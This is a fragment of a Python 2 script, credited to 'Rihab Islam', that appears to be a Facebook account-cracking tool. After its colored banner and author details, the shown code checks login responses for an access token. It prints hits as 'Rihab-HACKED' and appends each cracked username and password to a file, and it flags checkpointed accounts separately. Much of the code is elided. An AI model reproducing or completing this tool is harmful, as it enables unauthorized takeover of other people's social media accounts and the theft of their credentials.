#Tools Created By Rihab Islam
#Gorib Vai Gang Channel
#The Codder Of Bangladesh
...
\033[0;94m     _____  _ _           _               
\033[0;94m    |  __ \(_) |         | |                        
\033[0;96m    | |__) |_| |__   __ _| |__  
\033[0;96m    |  _  /| | '_ \ / _` | '_ \ 
\033[0;96m    | | \ \| | | | | (_| | |_) |
\033[0;96m    |_|  \_\_|_| |_|\__,_|_.__/ 
""")

print("\033[0;91mThis Tool's Free By Rihab islam")
...
def menu():
    ...
    print logo
    print ''
    print '\033[0;93mAUTHOR   : Rihab islam'
    print '\033[0;94mFACEBOOK : Md Rihab Ahmed M.M'
    print '\033[0;96mGITHUB   : github.com/RxRihab'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[Rihab-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[Rihab-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
